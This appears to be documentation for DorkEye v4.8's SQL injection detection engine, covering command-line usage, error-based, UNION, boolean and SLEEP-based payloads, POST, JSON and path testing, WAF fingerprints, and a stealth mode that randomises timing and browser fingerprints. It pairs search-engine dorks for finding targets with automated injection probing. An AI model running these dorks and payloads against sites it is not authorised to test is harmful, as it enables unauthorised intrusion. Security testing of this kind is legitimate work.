# SQL Injection Detection — DorkEye v4.8

DorkEye includes a built-in multi-method SQL injection engine that works on any URL with query parameters — no external tools required.

---

## Enable SQLi Testing

### During a dork search

```bash
python dorkeye.py -d "inurl:.php?id=" --sqli -o results.json
python dorkeye.py --dg=sqli --mode=medium --sqli --stealth -o results.json
```

### Direct test on a single URL (v4.8)

```bash
# SQLi auto-enabled — no --sqli flag needed
python dorkeye.py -u "https://example.com/page.php?id=1"

# With stealth and output
python dorkeye.py -u "https://example.com/page.php?id=1" --sqli --stealth -o result.json
```

### Re-test a saved results file (v4.8)

```bash
python dorkeye.py -f Dump/results.json --sqli -o retest.json
```

---

## Detection Methods

DorkEye runs **seven complementary methods** across GET parameters, POST forms, JSON bodies, and URL path segments.

### GET Parameters (methods 1–4)

Before running the full test suite, an **adaptive pre-probe** sends a single-quote (`1'`) to each parameter and measures the deviation from the baseline response. Parameters that produce no measurable noise (within the 4% buffer) are skipped, saving requests on inert parameters.

#### 1. Error-based

Injects payloads designed to trigger SQL error signatures in the response body.

**Payloads used:**

```
1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1
1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) as INT)
1'; SELECT NULL#
```

**Error signatures detected per database:**

| Database | Signatures |
|----------|-----------|
| MySQL / MariaDB | `You have an error in your SQL syntax`, `Warning.*mysqli?_`, `MySQLSyntaxErrorException`, `mysql_fetch_*`, `com.mysql.jdbc.exceptions` |
| PostgreSQL | `PostgreSQL.*ERROR`, `Warning.*\bpg_`, `Npgsql.`, `org.postgresql.util.PSQLException`, `ERROR: syntax error at or near`, `ERROR: unterminated quoted string` |
| MSSQL | `Driver.*SQL Server`, `OLE DB.*SQL Server`, `Unclosed quotation mark`, `Microsoft OLE DB Provider for SQL Server`, `Incorrect syntax near` |
| Oracle | `Oracle error`, `ORA-\d{5}`, `oracle.jdbc.driver`, `quoted string not properly terminated` |
| SQLite | `SQLite/JDBCDriver`, `SQLite.Exception`, `System.Data.SQLite.SQLiteException`, `sqlite3.OperationalError:`, `near "...": syntax error` |

Confidence: **HIGH** on first match — exits immediately, no further methods run.

#### 2. UNION-based

Probes column counts from 1 to 5 (`_UNION_COLUMNS_MAX = 5`) using four payload variants per column count.

**Payloads used (per n_cols):**

```
' UNION SELECT NULL[,NULL...]--
' UNION SELECT NULL[,NULL...]#
-1 UNION SELECT NULL[,NULL...]--
0 UNION ALL SELECT NULL[,NULL...]--
```

**UNION column-mismatch signatures detected:**

```
The used SELECT statements have a different number of columns
each UNION query must have the same number of columns
SELECTs to the left and right of UNION do not have the same number
ORA-01789
column count doesn't match
```

A response size delta >20% of the baseline combined with at least one prior column mismatch triggers a **MEDIUM** confidence flag.

#### 3. Boolean blind

Sends two true/false condition pairs and takes multiple response-size samples per payload.

**Payloads used:**

```
1' AND '1'='1   →  true condition
1' AND '1'='2   →  false condition
1 AND 1=1       →  true condition
1 AND 1=2       →  false condition
```

**Detection logic:** if the median response sizes for true vs. false differ by more than 15% of the baseline, and internal variance per group is below the 4% noise ceiling, the parameter is flagged as **MEDIUM** confidence.

Samples per payload: `3` (desktop) / `2` (Android/Termux).

#### 4. Time-based blind

Injects `SLEEP` payloads and measures actual elapsed time against a measured baseline.

**Payloads used:**

```
1' AND SLEEP(3) AND '1'='1
1 AND SLEEP(3)
```

**Threshold:** `baseline_latency + 3s (sleep) + 2.5s (margin) = threshold`

After a delay is detected, a neutral payload (`1' AND '1'='1`) is sent `2` times (1× on Android) to confirm the host is responsive without delays. Both confirmation requests must complete below `baseline + 2.5s` for the finding to be recorded.

Confidence: **MEDIUM** on confirmed time-based delay.

---

### POST Parameters (method 5, new in v4.8)

`test_post_sqli(url, post_data)` tests all form POST parameters using error-based detection.

**Payload:** each parameter value is suffixed with a single quote (`value'`).

If a DB error signature is matched, confidence is set to **HIGH** per parameter (score 3). Final `overall_confidence` is HIGH if average score ≥ 3, MEDIUM otherwise.

```python
# Example integration
result = detector.test_post_sqli(
    "https://example.com/login",
    {"username": "admin", "password": "pass"}
)
```

---

### JSON Body Parameters (method 6, new in v4.8)

`test_json_sqli(url, json_data)` sends POST requests with `Content-Type: application/json` and tests each string field.

**Payload:** same single-quote suffix (`value'`) injected into each JSON key.

WAF detection runs on every response; WAF-protected parameters are skipped.

```python
result = detector.test_json_sqli(
    "https://api.example.com/users",
    {"id": "1", "name": "test"}
)
```

---

### Path-based Parameters (method 7, new in v4.8)

`test_path_based_sqli(url)` appends a single quote to the last numeric or word path segment.

**Trigger condition:** URL path ends with `/\d+` or `/\w+`

**Payload:** `url + "'"`

Example: `https://example.com/products/42` → `https://example.com/products/42'`

Confidence: **HIGH** if a DB error signature matches.

---

## Parameter Prioritization

DorkEye does not test all parameters in random order. Parameters are ranked:

| Priority | Criteria |
|----------|----------|
| High | Numeric value (`?id=3`) or known high-risk name (`id`, `page`, `cat`, `user`) |
| Medium | Known medium-risk names (`search`, `q`, `query`, `lang`, `view`) |
| Low | Everything else |

**High-priority parameter names:** `id`, `pid`, `uid`, `nid`, `tid`, `cid`, `rid`, `eid`, `fid`, `gid`, `page`, `pg`, `p`, `num`, `item`, `product`, `prod`, `article`, `cat`, `category`, `sort`, `order`, `by`, `type`, `idx`, `index`, `ref`, `record`, `row`, `entry`, `post`, `news`, `view`

**Medium-priority parameter names:** `search`, `q`, `query`, `s`, `keyword`, `kw`, `term`, `find`, `name`, `user`, `username`, `login`, `email`, `mail`, `city`, `country`, `region`, `lang`, `language`, `filter`, `tag`, `label`, `topic`, `subject`, `section`

High-priority parameters are tested first. If a CRITICAL vulnerability is found in the first parameter, testing stops immediately.

---

## Scoring System

Each method that finds a vulnerability contributes points toward the `overall_confidence` for that parameter:

| Method | Condition | Points |
|--------|-----------|--------|
| Error-based | HIGH confidence | 3 — immediate return, no further methods |
| Union-based | HIGH confidence | 3 |
| Union-based | MEDIUM confidence | 2 |
| Union-based | LOW confidence | 1 |
| Boolean blind | any positive | 2 |
| Time-based blind | HIGH confidence | 3 |
| Time-based blind | MEDIUM confidence | 2 |

Final `overall_confidence` is determined by the **best per-parameter score**:

| Best score | Confidence |
|------------|------------|
| ≥ 5 | `critical` |
| ≥ 3 (or average ≥ 3) | `high` |
| ≥ 2 (or average ≥ 2) | `medium` |
| < 2 | `low` |

---

## Confidence Levels

| Level | Meaning |
|-------|---------|
| `critical` | Multiple methods confirmed — error-based + time-based or score ≥ 5 |
| `high` | Strong single method — error signature matched, score ≥ 3 |
| `medium` | Behavioral anomaly — UNION col mismatch or boolean differential |
| `low` | Weak signal — minor response variation |

---

## Terminal Output (v4.8 verbose)

When a URL is found vulnerable, DorkEye prints the method and evidence immediately:

```
[!] Potential SQLi found (critical): https://target.com/product.php?id=7
    ↳ method: error_based [param: id]  evidence: MYSQL error signature matched: extractvalue(0,...
    ↳ method: time_based_blind          evidence: SLEEP(5) triggered: elapsed=5.3s > threshold=5.2s
```

Same output appears during `-u` direct URL tests.

---

## WAF Detection

Before and during testing, DorkEye checks for WAF signatures in:
- Response header keys and values
- Response body (first 2000 chars)
- HTTP status codes (403, 406, 429 with short body)

**Detected WAFs:**

| WAF | Detection signals |
|-----|------------------|
| Cloudflare | `cf-ray`, `__cfduid`, `cloudflare`, `attention required! \| cloudflare` |
| mod_security | `mod_security`, `modsecurity`, `406 not acceptable` |
| Wordfence | `wordfence`, `generated by wordfence` |
| Sucuri | `x-sucuri-id`, `sucuri website firewall`, `access denied - sucuri` |
| Imperva | `x-iinfo`, `incapsula incident`, `_incap_ses_` |
| Akamai | `akamai`, `x-akamai-transformed`, `reference #18` |
| F5 BIG-IP | `x-waf-event-info`, `bigipserver`, `the requested url was rejected` |
| Barracuda | `barra_counter_session`, `barracuda` |
| FortiWeb | `fortigate`, `fortiweb` |
| AWS WAF | `x-amzn-requestid`, `awselb`, `forbidden - aws waf` |
| DenyAll | `denyall`, `x-denyall` |
| Reblaze | `x-reblaze-protection` |

When a WAF is detected, aggressive payloads are skipped for that URL.

---

## SQLi in the HTML Report

Vulnerable URLs are shown with:
- Color-coded badge: 🟣 CRITICAL / 🔴 VULN / 🟢 SAFE / ⬛ UNTESTED
- WAF indicator in the WAF column
- ⓘ detail popup with method, payload evidence, and confidence level

In the JSON output:

```json
{
  "sqli_test": {
    "tested": true,
    "vulnerable": true,
    "overall_confidence": "critical",
    "waf_detected": null,
    "message": "Tested 3 parameter(s)",
    "tests": [
      {
        "method": "error_based",
        "vulnerable": true,
        "confidence": "high",
        "evidence": ["MYSQL error signature matched: extractvalue(0,concat(...)"]
      },
      {
        "method": "time_based_blind",
        "vulnerable": true,
        "confidence": "high",
        "evidence": ["SLEEP(5) triggered: elapsed=5.3s >= threshold=5.2s"]
      }
    ]
  }
}
```

---

## Stealth Mode

```bash
python dorkeye.py -d dorks.txt --sqli --stealth -o results.json
```

With `--stealth`:
- Random delays of 3–6s between parameters (vs 0.5s normally)
- Random delays of 1.5–3s between payloads within error-based testing
- Baseline measurements use slower timing
- Fingerprint rotation uses more conservative browser profiles
